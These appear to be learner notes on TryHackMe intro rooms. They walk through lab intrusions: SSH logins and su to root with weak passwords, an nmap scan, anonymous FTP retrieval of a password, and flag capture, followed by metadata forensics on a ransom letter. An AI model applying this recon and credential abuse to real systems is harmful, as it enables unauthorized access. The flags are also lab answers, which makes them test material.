
## Operating System Security

[link][https://tryhackme.com/room/operatingsystemsecurity]

```
>>> ssh sammie@10.10.223.168; pw: dragon
>>> su - johnny; pw: abc123
>>> su - root; pw: happyHack!NG
THM{YouGotRoot}
```

## Network Security

[link](https://tryhackme.com/room/intronetworksecurity)

- Steps to break into network

```
# 1. Recon
>>> nmap 10.10.133.59 
 21/tcp open  ftp
 22/tcp open  ssh 
 80/tcp open  http

# 2. TCP
>>> tcp 10.10.133.59; Name: anonymous
>>> get secret.txt; cat secret.txt; password: ABC789xyz123

# 3. Connecting to root
>>> ssh root@10.10.133.59; pw: ABC789xyz123
>>> cat flag.txt; 
THM{FTP_SERVER_OWNED}

# 4. Finding other account flags
>>> cd /home/librarian
>>> cat flag.txt; THM{LIBRARIAN_ACCOUNT_COMPROMISED}

```

## Intro to Digital Forensics

[link](https://tryhackme.com/room/introdigitalforensics)

* establishing chain of custody to keep track of who has what evidence;

```
>>> cd ransomletter2/

# 1. check pdf metadata with 'pdfinfo'
>>> pdfinfo ransom-letter.pdf
Ann Gree Shepherd

# 2. check image metadata using 'exiftool'
>>> exiftool letter-image.jpg
GPS Position: 51 deg 30' 51.90" N, 0 deg 5' 38.73" W
51° 30' 51.90" N, 0° 5' 38.73" W
site: https://www.findlatitudeandlongitude.com/l/51+30%27+N+0+07%27+W/1478795/

```

## Security Operations

[link](https://tryhackme.com/room/securityoperations)




